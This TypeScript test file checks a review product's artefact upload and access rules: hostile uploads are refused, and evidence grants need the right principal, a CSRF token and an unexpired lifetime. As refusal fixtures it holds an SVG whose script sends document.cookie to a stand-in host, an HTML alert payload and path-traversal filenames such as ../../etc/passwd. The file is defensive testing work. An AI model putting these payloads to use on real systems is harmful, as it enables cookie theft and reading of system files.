/**
 * Hostile-artefact and evidence-access tests
 * (`docs/TESTING.md` section 10 "Artefacts", `docs/SECURITY.md` section 13,
 * ADR-0019).
 *
 * Screenshots are the most sensitive thing this product stores
 * (`docs/SECURITY.md` section 2), and every case here is one of the ways an
 * uploader or a reader could turn that store into something else: a document
 * that executes, a name that is a path, or a fetch that needs no credential.
 */

import assert from "node:assert/strict";
import { after, before, beforeEach, test } from "node:test";

import {
  BOOTSTRAP_TOKEN,
  WORKER_CREDENTIAL,
  seedProjectAndWorker,
  startHarness,
  type Harness,
} from "./support/worker-harness.ts";
import { claimSessionFor } from "./support/identity.ts";
import { encodePng, sha256 } from "./support/png.ts";
import { startMigratedDatabase, truncateAll, type MigratedDatabase } from "./support/postgres.ts";

let postgres: MigratedDatabase;
let harness: Harness;

before(async () => {
  postgres = await startMigratedDatabase();
});

after(async () => {
  await harness?.stop();
  await postgres?.stop();
});

beforeEach(async () => {
  await harness?.stop();
  await truncateAll(postgres.pool);
  harness = await startHarness(postgres.pool);
});

const ADMIN = { authorization: `Bearer ${BOOTSTRAP_TOKEN}` };
const WORKER = { authorization: `Bearer ${WORKER_CREDENTIAL}` };

/** A real SVG with a script in it: the classic active-content artefact. */
const MALICIOUS_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg" width="780" height="1688">` +
    `<script>fetch("https://exfiltrate.invalid/?c="+document.cookie)</script>` +
    `<rect width="100%" height="100%" fill="#0f172a"/></svg>`,
  "utf8",
);

const MALICIOUS_HTML = Buffer.from(
  `<!doctype html><html><body><script>alert(1)</script></body></html>`,
  "utf8",
);

const PNG = encodePng(780, 1688);

async function intent(projectId: string, overrides: Record<string, unknown> = {}) {
  return harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers: WORKER,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: PNG.byteLength,
      sha256: sha256(PNG),
      retention_class: "verification_evidence",
      ...overrides,
    },
  });
}

test("an SVG uploaded as a screenshot is refused and never becomes an artefact", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const created = await intent(projectId, {
    size_bytes: MALICIOUS_SVG.byteLength,
    sha256: sha256(MALICIOUS_SVG),
  });
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;

  const uploaded = await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: MALICIOUS_SVG,
  });
  assert.equal(uploaded.statusCode, 400, uploaded.body);
  const body = uploaded.json() as { error: { code: string; message: string } };
  assert.equal(body.error.code, "UNSUPPORTED_CAPABILITY");
  // The refusal says what was actually uploaded, which is what an operator
  // reading the audit trail needs.
  assert.match(body.error.message, /image\/svg\+xml/u);
  process.stdout.write(`EVIDENCE malicious SVG: ${body.error.code} ${body.error.message}\n`);

  const record = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal((record.json() as { data: { state: string } }).data.state, "failed");

  // Nothing reached the store: there is no file to serve, however it is asked for.
  const granted = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers: ADMIN,
  });
  assert.equal(granted.statusCode, 409);
});

test("an HTML document uploaded as a screenshot is refused", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const created = await intent(projectId, {
    size_bytes: MALICIOUS_HTML.byteLength,
    sha256: sha256(MALICIOUS_HTML),
  });
  const { upload_path: uploadPath } = (
    created.json() as { data: { upload_path: string } }
  ).data;
  const uploaded = await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: MALICIOUS_HTML,
  });
  assert.equal(uploaded.statusCode, 400);
  const message = (uploaded.json() as { error: { code: string; message: string } }).error;
  assert.match(message.message, /text\/html/u);
  process.stdout.write(`EVIDENCE malicious HTML: ${message.code} ${message.message}\n`);
});

test("a declared media type that contradicts the bytes is refused", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  // Real PNG bytes, declared as JPEG.
  const created = await intent(projectId, { content_type: "image/jpeg" });
  const { upload_path: uploadPath } = (created.json() as { data: { upload_path: string } }).data;
  const uploaded = await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/jpeg" },
    payload: PNG,
  });
  assert.equal(uploaded.statusCode, 400);
  const error = (uploaded.json() as { error: { code: string; message: string } }).error;
  assert.match(error.message, /image\/png, not the declared image\/jpeg/u);
  process.stdout.write(`EVIDENCE MIME mismatch: ${error.code} ${error.message}\n`);
});

test("an unsupported media type never reaches an intent at all", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  for (const contentType of ["image/svg+xml", "text/html", "application/octet-stream"]) {
    const refused = await intent(projectId, { content_type: contentType });
    assert.equal(refused.statusCode, 400, `${contentType} was accepted`);
    process.stdout.write(
      `EVIDENCE unsupported content type ${contentType}: ${
        (refused.json() as { error: { code: string } }).error.code
      }\n`,
    );
  }
});

test("an oversized upload is refused", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const declared = await intent(projectId, { size_bytes: 999_999_999 });
  assert.equal(declared.statusCode, 403);
  const error = (declared.json() as { error: { code: string; message: string } }).error;
  assert.equal(error.code, "POLICY_DENIED");
  process.stdout.write(`EVIDENCE oversized intent: ${error.code} ${error.message}\n`);
});

test("a hash mismatch leaves the artefact failed and unreadable", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const other = encodePng(780, 1688, [255, 0, 0]);
  const created = await intent(projectId, {
    sha256: sha256(other),
    size_bytes: other.byteLength,
  });
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;
  await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: PNG,
  });
  const completed = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: sha256(other) },
  });
  assert.equal(completed.statusCode, 409);
  const error = (completed.json() as { error: { code: string; message: string } }).error;
  assert.equal(error.code, "ARTEFACT_UPLOAD_INCOMPLETE");
  process.stdout.write(`EVIDENCE hash mismatch: ${error.code} ${error.message}\n`);

  const state = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal((state.json() as { data: { state: string } }).data.state, "failed");

  // No completion event was written, and the failure was. A consumer of the
  // event stream must never see this artefact announced as evidence: the
  // stream is what other services act on, so "unavailable in the database but
  // announced on the stream" would be the worst of the two.
  const events = await postgres.pool.query<{ type: string }>(
    "SELECT type FROM events WHERE correlation->>'artefact_id' = $1 ORDER BY sequence",
    [artefactId],
  );
  const types = events.rows.map((row) => row.type);
  assert.deepEqual(types, ["artefact.upload_started", "artefact.upload_failed"]);
  assert.ok(!types.includes("screenshot.captured"), "a failed artefact announced a capture");
});

test("path traversal in filename metadata is refused", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  for (const filename of [
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "/etc/shadow",
    "../secrets.png",
    ".hidden",
    "name with spaces.png",
  ]) {
    const refused = await intent(projectId, { filename });
    assert.equal(refused.statusCode, 400, `${filename} was accepted`);
    const error = (refused.json() as { error: { code: string; message: string } }).error;
    assert.equal(error.code, "UNSUPPORTED_CAPABILITY");
    process.stdout.write(`EVIDENCE filename ${filename}: ${error.code} ${error.message}\n`);
  }

  // A plain name is accepted and stays metadata: the key is the digest.
  const accepted = await intent(projectId, { filename: "homepage-390x844.png" });
  assert.equal(accepted.statusCode, 201);
});

test("artefact content is unreachable without a live grant issued to the caller", async () => {
  const { projectId, organisationId } = await seedProjectAndWorker(harness);
  const created = await intent(projectId, { filename: "homepage.png" });
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;
  await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: PNG,
  });
  await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: sha256(PNG) },
  });

  // The route that used to serve bytes from an identifier does not exist.
  const guessed = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}/content`,
    headers: ADMIN,
  });
  assert.equal(guessed.statusCode, 404, "an artefact-addressed content path still exists");

  // An invented grant identifier is refused.
  const invented = await harness.built.app.inject({
    method: "GET",
    url: "/api/v1/artefact-content/agr_not_a_real_grant",
    headers: ADMIN,
  });
  assert.equal(invented.statusCode, 401);

  const granted = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers: ADMIN,
  });
  assert.equal(granted.statusCode, 201);
  const grant = (granted.json() as { data: { url: string; grant_id: string; expires_at: string } })
    .data;
  assert.match(grant.url, /^\/api\/v1\/artefact-content\/agr_/u);
  // The path holds the grant and not the artefact: knowing an artefact
  // identifier tells an attacker nothing about where its bytes are.
  assert.ok(!grant.url.includes(artefactId));
  assert.ok(new Date(grant.expires_at).getTime() - Date.now() <= 121_000);

  // The grant alone is not enough: an unauthenticated request is refused.
  const anonymous = await harness.built.app.inject({ method: "GET", url: grant.url });
  assert.equal(anonymous.statusCode, 401);

  // A different principal holding the same grant is refused too, and refused
  // identically: an unknown grant, an unauthenticated caller and a wrong
  // subject are three facts and one answer, or the route is an existence oracle
  // over grant identifiers (RVP-67).
  const wrongPrincipal = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: WORKER,
  });
  assert.equal(wrongPrincipal.statusCode, 401);
  const strip = (body: string): string => body.replace(/"request_id":"[^"]*"/u, '"request_id":"x"');
  assert.equal(strip(wrongPrincipal.body), strip(invented.body));
  assert.equal(strip(anonymous.body), strip(invented.body));
  process.stdout.write(
    `EVIDENCE grant scoping: anonymous ${String(anonymous.statusCode)}, ` +
      `wrong principal ${String(wrongPrincipal.statusCode)}, unknown ${String(invented.statusCode)}, ` +
      `one body ${strip(invented.body)}\n`,
  );

  const served = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: ADMIN,
  });
  assert.equal(served.statusCode, 200);
  assert.equal(served.headers["content-type"], "image/png");
  assert.equal(served.headers["x-content-type-options"], "nosniff");
  assert.equal(served.headers["content-security-policy"], "default-src 'none'; sandbox");
  assert.equal(served.headers["referrer-policy"], "no-referrer");
  assert.equal(served.headers["cache-control"], "private, no-store");
  assert.equal(sha256(served.rawPayload), sha256(PNG));

  // An expired grant stops working.
  await postgres.pool.query(
    `UPDATE artefact_access_grants
        SET created_at = now() - interval '10 minutes', expires_at = now() - interval '1 second'
      WHERE id = $1`,
    [grant.grant_id],
  );
  const expired = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: ADMIN,
  });
  assert.equal(expired.statusCode, 401);
  process.stdout.write(`EVIDENCE expired grant: ${String(expired.statusCode)}\n`);

  // The access was audited (`docs/SECURITY.md` section 16).
  const events = await postgres.pool.query<{ type: string; actor_type: string }>(
    "SELECT type, actor_type FROM events WHERE project_id = $1 AND type = 'artefact.access_granted'",
    [projectId],
  );
  assert.equal(events.rows.length, 1);
  assert.equal(events.rows[0]?.actor_type, "human_user");
  assert.ok(organisationId.length > 0);
});

/** Uploads and completes one screenshot, and answers its identifier. */
async function storedArtefact(projectId: string): Promise<string> {
  const created = await intent(projectId);
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;
  await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: PNG,
  });
  await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: sha256(PNG) },
  });
  return artefactId;
}

test("a viewer scoped to another project cannot reach this artefact", async () => {
  const first = await seedProjectAndWorker(harness);
  const artefactId = await storedArtefact(first.projectId);

  const second = await seedProjectAndWorker(harness);
  const minted = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${second.projectId}/viewer-sessions`,
    headers: ADMIN,
  });
  const token = (minted.json() as { data: { token: string } }).data.token;
  const cookie = `reviewplane_viewer=${encodeURIComponent(token)}`;

  // The project scope is in the query, not in a check after the lookup, so a
  // foreign artefact is not found rather than forbidden. `docs/TESTING.md`
  // section 10 requires that identifiers from another tenant are not
  // enumerable, and `PROJECT_CONTEXT_MISMATCH` here — which is what this route
  // used to answer (RVP-67) — confirms that the identifier exists.
  const read = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: { cookie },
  });
  assert.equal(read.statusCode, 404, read.body);
  assert.equal((read.json() as { error: { code: string } }).error.code, "RESOURCE_NOT_FOUND");

  const unknown = await harness.built.app.inject({
    method: "GET",
    url: "/api/v1/artefacts/art_01JNOSUCHARTEFACT",
    headers: { cookie },
  });
  const strip = (body: string): string => body.replace(/"request_id":"[^"]*"/u, '"request_id":"x"');
  assert.equal(strip(read.body), strip(unknown.body), "the two refusals must be indistinguishable");

  // Minting a grant is a state change, and this session — the ADR-0016
  // exchange — carries no CSRF token, so it is refused before its project scope
  // is considered at all. Strictly the stronger refusal of the two.
  const refused = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers: { cookie },
  });
  assert.equal(refused.statusCode, 403, refused.body);
  assert.equal(
    (refused.json() as { error: { details?: { reason?: string } } }).error.details?.reason,
    "csrf_token_invalid",
  );

  const grants = await postgres.pool.query<{ count: string }>(
    "SELECT count(*)::text AS count FROM artefact_access_grants WHERE artefact_id = $1",
    [artefactId],
  );
  assert.equal(grants.rows[0]?.count, "0", "a refused request minted a grant");
});

test("minting an artefact grant refuses a cookie session without the CSRF token", async () => {
  // A grant is a row plus an `artefact.access_granted` event, so minting one is
  // a state change and `docs/API.md` section 4.0 applies to it. The route
  // resolved a viewer session and asked for nothing else, which let another
  // origin's markup mint evidence grants with a signed-in person's cookie.
  const { organisationId, projectId } = await seedProjectAndWorker(harness);
  const artefactId = await storedArtefact(projectId);
  const cookies = await claimSessionFor(harness.built, postgres.pool, organisationId);

  const forged = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers: cookies.readHeaders,
  });
  assert.equal(forged.statusCode, 403, forged.body);
  const body = forged.json() as { error: { code: string; details?: { reason?: string } } };
  assert.equal(body.error.code, "AUTHORISATION_DENIED");
  assert.equal(body.error.details?.reason, "csrf_token_invalid");
  process.stdout.write(
    `EVIDENCE forged POST /api/v1/artefacts/:id/grants -> 403 ${forged.body}\n`,
  );

  const none = await postgres.pool.query<{ count: string }>(
    "SELECT count(*)::text AS count FROM artefact_access_grants WHERE artefact_id = $1",
    [artefactId],
  );
  assert.equal(none.rows[0]?.count, "0", "a forged request minted a grant");

  // With the token the same request works, and reading the bytes back with the
  // cookie alone still works: a read needs no token.
  const granted = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers: cookies.writeHeaders,
  });
  assert.equal(granted.statusCode, 201, granted.body);
  const grant = (granted.json() as { data: { url: string } }).data;

  const served = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: cookies.readHeaders,
  });
  assert.equal(served.statusCode, 200, served.body);
  assert.equal(sha256(served.rawPayload), sha256(PNG));
});

test("the browser worker container holds no artefact storage of any kind", async () => {
  // ADR-0012: "Browser workers upload artefacts through the control-plane
  // artefact API and hold no storage credentials." That is a fact about the
  // deployment rather than about a code path, so it is asserted against the
  // deployment: the worker service must mount no artefact volume, hold no
  // artefact secret, and read no artefact or S3 setting.
  const { readFile } = await import("node:fs/promises");
  const { join } = await import("node:path");
  const compose = await readFile(
    join(import.meta.dirname, "..", "..", "..", "deploy", "compose", "compose.yaml"),
    "utf8",
  );

  // The worker's own block, from its service key to the next service at the
  // same indentation. Parsed by hand rather than adding a YAML dependency to
  // the server's test tree; the block is asserted to have been found, so a
  // rename fails the test instead of silently asserting nothing.
  const start = compose.indexOf("\n  browser-worker:");
  assert.ok(start >= 0, "the compose file has no browser-worker service");
  const rest = compose.slice(start + 1);
  const nextService = /\n {2}[a-z][a-z0-9-]*:\n/u.exec(rest.slice(1));
  const block = nextService === null ? rest : rest.slice(0, nextService.index + 1);
  assert.ok(block.includes("REVIEWPLANE_WORKER_NAME"), "the worker block was not isolated");

  assert.equal(
    /artefact/iu.test(block),
    false,
    `the browser-worker service references artefact storage:\n${block}`,
  );
  assert.equal(
    /REVIEWPLANE_S3_|s3_access|s3_secret/iu.test(block),
    false,
    `the browser-worker service references S3 credentials:\n${block}`,
  );
  // What it does have: a route to the control-plane API, which is the only way
  // it can store anything at all.
  assert.match(block, /http:\/\/server:8080/u);
  process.stdout.write(
    "EVIDENCE worker storage: the browser-worker compose service mounts no artefact volume, holds no artefact secret and reads no artefact or S3 setting; it uploads through http://server:8080\n",
  );
});
